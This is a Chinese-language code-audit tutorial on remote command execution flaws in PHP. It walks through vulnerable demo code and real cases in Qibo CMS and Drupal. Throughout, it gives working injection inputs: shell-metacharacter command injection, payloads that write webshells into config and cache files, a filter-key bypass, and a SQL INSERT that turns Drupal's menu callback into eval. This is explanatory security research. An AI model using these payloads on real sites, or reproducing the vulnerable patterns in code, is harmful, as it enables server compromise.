# 说说RCE那些事儿

0x01 引言
-------

* * *

如果OWASP给PHP漏洞弄个排行榜，那RCE（远程命令执行）绝对是最臭名昭著漏洞的前十名，其攻击方式灵活，且攻击成功后一般返回继承了web组件（如apache）权限的shell，危害自不必再多描述。那么，今天就来看看代码审计中到底该在哪里寻找命令执行？或者说，哪些功能会导致代码执行？

0x02漏洞寻踪
--------

* * *

这是一个最简单的命令执行漏洞

```
//index.php
<?php 
$cmd=$_GET['cmd'];
 system($cmd); ?> 

```

我们可以执行

```
index.php?cmd=whoami 

```

特别注意如果我们使用了

```
<?php 
$cmd=$_GET['cmd']; 
echo exec($cmd); 
?>

```

由于`exec()`默认没有回显，所以执行命令之后 我们是看不到结果的， 当然我们能够通过重定向，把他们导入文件中，再来查询

当然这些代码一般情况下是不可能出现在程序中的，我们仅作了解。 那么…… 到底哪里会出现命令执行呢？

**Demo #1 实现查询dns的RCE**

这是一个实现查询dns命令的php程序片段，由于要和系统产生信息通道，使用了system()函数，过滤不严也导致了RCE。

```
<?php

    include("common.php");
    showMenu();
    echo '<br>';
    $status = $_GET['status'];
    $ns  = $_GET['ns'];
    $host   = $_GET['host'];
    $query_type   = $_GET['query_type']; // ANY, MX, A , etc.
    $ip     = $_SERVER['REMOTE_ADDR'];
    $self   = $_SERVER['PHP_SELF'];
        $host = trim($host);
          $host = strtolower($host);
          echo("<span class=\"plainBlue\"><b>Executing : <u>dig @$ns $host $query_type</u></b><br>");
          echo '<pre>';
          //start digging in the namserver
          system ("dig @$ns $host $query_type");
          echo '</pre>';
    } else {
?>

```

如果我们请求

```
dig.php?ns=whoam&host=sirgod.net&query_type=NS&status=digging

```

明显`system ("dig whoami sirgod.com NS");`是不能执行的

所以我们用“||”分别执行linux命令

```
dig.php?ns=||whoami||&host=sirgod.net&query_type=NS&status=digging

system ("dig ||whoami|| sirgod.net NS");

```

那么我们就分离了dig命令和whoami 成功执行

**Demo #2 配置信息保存不当的RCE**

很多时候php的配置信息是直接保存在.php后缀的文件里面的 比如discuz 如果没有认真过滤…

```
  if(isset($action) && $action == "setconfig") {
    $config_file = "config.php";
    $handle = fopen($config_file, 'w');
    $StringData = "<?php\r
    $"."news_width = '".clean($_POST[news_width])."';\r
    $"."bgcolor = '".clean($_POST[bgcolor])."';\r
    $"."fgcolor = '".clean($_POST[fgcolor])."';\r
    $"."padding = '".clean($_POST[padding])."';\r
    $"."subject_margin = '".clean($_POST[subject_margin])."';\r
    $"."fontname = '".clean($_POST[fontname])."';\r
    $"."fontsize = '".clean($_POST[fontsize])."';\r\n?>";
    fwrite($handle, $StringData);
  }

```

那么如果正常提交 就是

```
<?php 
$news_width = '600px'; 
$bgcolor = '#000000';
$fgcolor = '#ffffff'; 
$padding = '5px'; 
$subject_margin = '0px'; 
$fontname = 'verdana'; 
$fontsize = '13px'; 
?>

```

我们要是提交`';system($_GET['cmd']);'`

配置文件就会变成

```
<?php 
$news_width = '';
system($_GET['cmd']);
'';
 $bgcolor = '#000000';
 $fgcolor = '#ffffff'; 
$padding = '5px'; 
$subject_margin = '0px'; 
$fontname = 'verdana';
 $fontsize = '13px'; 
?> 

```

很明显这就是个合法的php文件了，也成为了一个webshell。

**Demo #2 缓存写入不当的RCE**

```
$newsfile = "news.txt"; 
$file = fopen($newsfile, "r"); 
..........................................................................
 elseif ((isset($_REQUEST["title"])) && (isset($_REQUEST["date"])) &&
(isset($_REQUEST["post"])) && ($_REQUEST["title"]!="") &&
($_REQUEST["date"]!="") && ($_REQUEST["post"]!="")) {
$current_data = @fread($file, filesize($newsfile));
fclose($file);
$file = fopen($newsfile, "w");
$_REQUEST["post"] = stripslashes(($_REQUEST["post"]));
$_REQUEST["date"] = stripslashes(($_REQUEST["date"]));
$_REQUEST["title"] = stripslashes(($_REQUEST["title"]));
if(fwrite($file,$btable . " " . $btitle . " " . $_REQUEST["title"] . " " .  $etitle . " " . $bdate . " " . $_REQUEST["date"] . " " . $edate . " " . $bpost . " " . $_REQUEST["post"] . " " . $epost . " " . $etable . "\n " . $current_data))
include 'inc/posted.html';
else 
include 'inc/error1.html'; 
fclose($file);

```

这个代码的业务功能就是写入缓存，是下次使用之前直接调用静态文件 如何显示给访客呢

```
<? include("news.txt"); ?>

```

那么我们试试注入shell

```
<table class='sn'> <tbody> 
<tr><td class='sn-title'> 
<?php system($_GET['cmd']); ?> 
</td></tr> <tr><td class='sn-date'> 
Posted on: 08/06/2009 </td></tr> <tr><td class='sn-post'> test2 </td></tr> </tbody></table><div><br /></div> <table class='sn'> <tbody> <tr><td class='sn-title'> test </td></tr> <tr><td class='sn-date'> Posted on: 08/06/2009 </td></tr> <tr><td class='sn-post'> test </td></tr> </tbody></table><div><br /></div>

```

访问display.php?cmd=whoami 成功执行

0x03 实例剖析
---------

* * *

有人就说了，上面代码是简单的phpdemo而已，实际环境中的审计肯定没有那么简单，那么，当我们面对完整的php程序，他们面对对象，基于各种框架，还怎么去寻找RCE的踪迹呢？

我们来看几个实例

齐博cms缓存写入导致远程代码执行 漏洞文件

```
foreach($label AS $key=>$value){
var_dump ($value);exit;//如果是新标签时,即为数组array(),要清空
if(is_array($value))
{
$label[$key]='';
}
}
//写缓存
if( (time()-filemtime($FileName))>($webdb[label_cache_time]*60) ){
$_shows="<?php\r\n\$haveCache=1;\r\n";

foreach($label AS $key=>$value){
$value=addslashes($value);
$_shows.="\$label['$key']=stripslashes('$value');\r\n";
}
write_file($FileName,$_shows.'?>');
} 
}

```

这段代码功能很好分析 遍历标签（$label）变量，并且写入缓存，

我们看看过滤函数

```
function Add_S($array){
 foreach($array as $key=>$value){
if(!is_array($value)){
@eregi("['\\\"&]+",$key) && die('ERROR KEY!');
$value=str_replace("&#x","& # x",$value); //过滤一些不安全字符
$value=preg_replace("/eval/i","eva l",$value); //过滤不安全函数
!get_magic_quotes_gpc() && $value=addslashes($value);
$array[$key]=$value;
}else{
$array[$key]=Add_S($array[$key]); 
}
}
return $array;
}

```

这里检测key的机制就出问题,,我画了个图

![enter image description here](http://drops.javaweb.org/uploads/images/4e03141e2406d0f2ca046bfd1bb02b1c553248c6.jpg)

简而言之，他只检测最底层的key 所以我们提交`label[evilcode][asd]=xx`匹配的key是asd 那么就不会被匹配出 evilcode就不会被检测。

由于qibo是 伪全局

```
foreach($_POST AS $_key=>$_value){
!ereg("^\_[A-Z]+",$_key) && $$_key=$_POST[$_key];
}
foreach($_GET AS $_key=>$_value){
!ereg("^\_[A-Z]+",$_key) && $$_key=$_GET[$_key];
}

```

会帮我们注册好提交的变量 所以$label是能够直接控制的

那么也就是当我们提交

```
label['.phpinfo().'][asd]=sb

```

提交的key为`''.phpinfo().''`那么写入的本地文件就是

```
\$label[''.phpinfo().'']=stripslashes();\r\n"; 

```

![enter image description here](http://drops.javaweb.org/uploads/images/e7649d4a396e5aed65ac84adcd8a427449fd0523.jpg)

这时所有引号全都闭合

缓存文件夹中也就写入了我们的shell

**Drupal函数回调导致的RCE**

Drupal作为世界上公认最强大的phpweb框架，一直在追求更安全的开发方法 比如，它采用预编译的方法进行SQL交互，使得SQL注入漏洞几乎难以挖掘。然而在近期，由于一个功能中将SQL预编译权利交给了用户。

```
$query = preg_replace('#' . $key . '\b#', implode(', ', array_keys($new_keys)), $query);

```

**插入用户输入数据导致sql注入**

又由于drupal采用的PDO是支持多行的，所以能执行任意语句，当然这不是今天的重点。 今天我们看看如何漏洞扩大，把SQLI变成RCE 首先讲下`call_user_func_array`

(PHP 4 >= 4.0.4, PHP 5)

调用回调函数，并把一个数组参数作为回调函数的参数 说明

```
mixed call_user_func_array ( callable $callback , array $param_arr )


$preferred_links = &drupal_static(__FUNCTION__); 
 If (!isset($path)) {    $path = $_GET['q'];  }

```

首先$path作为变量是可控的

```
function menu_execute_active_handler($path = NULL, $deliver = TRUE) {
 $page_callback_result = _menu_site_is_offline() ? MENU_SITE_OFFLINE : MENU_SITE_ONLINE; 
$read_only_path = !empty($path) ? $path : $_GET['q']; drupal_alter('menu_site_status', $page_callback_result, $read_only_path); 
if ($page_callback_result == MENU_SITE_ONLINE) { 
         if ($router_item = menu_get_item($path)) {
              if ($router_item['access']) { 
                   if ($router_item['include_file']) { 
require_once DRUPAL_ROOT . '/' . $router_item['include_file']; } $page_callback_result = call_user_func_array($router_item['page_callback'], $router_item['page_arguments']);
 } else { $page_callback_result = MENU_ACCESS_DENIED; 
} } else { $page_callback_result = MENU_NOT_FOUND; } } }

if ($router_item['include_file']) { require_once DRUPAL_ROOT . '/' . $router_item['include_file']; }

```

包含了文件

**通过预编译注入向表中插入一个语句**

```
insert into menu_router (path, page_callback, access_callback, include_file) values ('<?php phpinfo();?>','eval', '1', 'modules/php/php.module');

```

path 为要执行的代码； include_file 为 PHP filter Module 的路径； page_callback 为 eval； access_callback 为 1（可以让任意用户访问）。 访问地址即可造成 RCE。

![enter image description here](http://drops.javaweb.org/uploads/images/5d8dea26591f309578433a98d461d1adf4af5e1f.jpg)

0x04 写在最后
---------

* * *

一般来讲，漏洞形成的原因基本都是“数据与代码未有效分离”，然而RCE是个例外，往往出现rce的地方本来就是供程序执行代码的地方，加上如今php程序功能越来越强大，各种地方相互调用，导致组合利用漏洞。所以程序员写起代码来往往都不知道改怎么去防御，或者说防不胜防。 由于其漏洞实现的灵活性，寻找RCE，还是应该从功能入手，去研究代码实现了什么功能，最后变量进入什么函数，被如何调用，而不是简简单单的去进行关键字搜索，毕竟，如今代码审计已经从“哪里有洞”过渡到“如何绕过”的时代了。